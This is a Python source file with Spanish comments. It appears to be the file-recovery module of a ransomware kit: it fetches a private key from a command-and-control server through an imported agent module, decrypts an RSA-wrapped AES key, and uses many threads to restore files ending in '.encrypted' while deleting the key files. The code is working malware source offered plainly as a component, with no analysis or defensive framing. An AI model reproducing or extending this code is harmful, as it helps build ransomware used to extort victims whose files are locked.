import os
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from find_files import find_files
import agent
from concurrent.futures import ThreadPoolExecutor, as_completed

def load_private_rsa_key(): 
    with open("rsa_private.pem", "rb") as f:
        return RSA.import_key(f.read())

def load_aes_key_encrypted():
    with open("aes_key_encrypted.bin", "rb") as f:
        return f.read()

def decrypt_aes_key_encrypted (rsa_private_key, aes_key_encrypted):
    cipher_rsa = PKCS1_OAEP.new(rsa_private_key)
    return cipher_rsa.decrypt(aes_key_encrypted)

def decrypt_file(file, aes_key_decrypted):
    try:
        with open(file, "rb") as f:
            nonce_and_encrypted_data = f.read()
        nonce = nonce_and_encrypted_data[:12]  # El nonce ocupa los primeros 12 bytes
        encrypted_data = nonce_and_encrypted_data[12:]  # Datos cifrados resto de bytes
        cipher = AES.new(aes_key_decrypted, AES.MODE_CTR, nonce=nonce)
        decrypted_data = cipher.decrypt(encrypted_data)
        with open(file, "wb") as f:
            f.write(decrypted_data)  # Sobrescribimos el archivo con los datos descifrados
        file_decrypted = file[:-10]  # Elimina la extensión '.encrypted'
        os.rename(file, file_decrypted)  # Renombramos el archivo, eliminando la extensión '.encrypted'
        print(f"Archivo descifrado: {file} -> {file_decrypted}")
    except Exception as e:
        print(f"Error descifrando {file}: {e}")

def decrypt_files():
    agent.get_private_key()  # Obtiene la clave privada del agente desde C2
    files = find_files()  # Obtiene la lista de archivos a descifrar
    rsa_private_key = load_private_rsa_key()  # Carga la clave privada RSA
    aes_key_encrypted = load_aes_key_encrypted()  # Carga la clave AES cifrada
    # Descifra la clave AES con la privada RSA
    aes_key = decrypt_aes_key_encrypted(rsa_private_key, aes_key_encrypted)  
    os.remove("aes_key_encrypted.bin")  # Elimina la clave AES cifrada después de su uso
    os.remove("rsa_private.pem") # Elimina la clave privada RSA
    # Ejecuta el descifrado en múltiples hilos usando ThreadPoolExecutor, descifra archivos ".encrypted"
    with ThreadPoolExecutor(max_workers = 20) as executor:
        futures = [executor.submit(decrypt_file, file, aes_key) for file in files if file.endswith(".encrypted")]
        for future in as_completed(futures):
            future.result()  # Espera a que cada tarea termine y captura excepciones
    print("Archivos descifrados correctamente.")  

